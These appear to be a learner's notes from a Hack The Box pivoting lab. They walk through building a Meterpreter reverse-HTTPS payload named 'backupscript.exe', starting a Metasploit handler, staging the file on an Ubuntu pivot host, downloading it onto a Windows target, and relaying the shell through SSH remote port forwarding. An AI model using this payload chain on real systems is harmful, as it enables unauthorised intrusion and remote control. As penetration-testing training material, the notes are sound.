![[Pasted image 20251104170636.png]]

- In order for us to get a connection, we need to use the Ubuntu server as a pivot host. However, we don't want to establish an RDP connection anymore, we want to gain a reverse shell. 
- Knowing that we want a reverse shell, we need to create a payload using msfvenom that basically routes packets from the Windows machine, back to the Ubuntu machine, which then routes traffic back to our attack host. 

```shell-session
realCustampin@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Configuring and Starting the multi/handler: 
```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

**Transferring the Payload to Pivot Host:**
```shell-session
realCustampin@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00 
```

**Starting Python3 Webserver on Pivot Host:**
```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

**Downloading Payload on Windows Target:**
```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Now that we have the payload downloaded onto our target host, we need to set up our SSH Port Forwarding to forward connections from the ubuntu server's port 8080 to our msfconolse's listener service on port 8000. 

**Using -R with SSH**
```shell-session
realCustampin@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

Now that we have we have the SSH Remote Port Forward set up, we can now execute the payload on the target windows host. 

![[Pasted image 20251104171935.png]]

## Lab Questions: 

Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)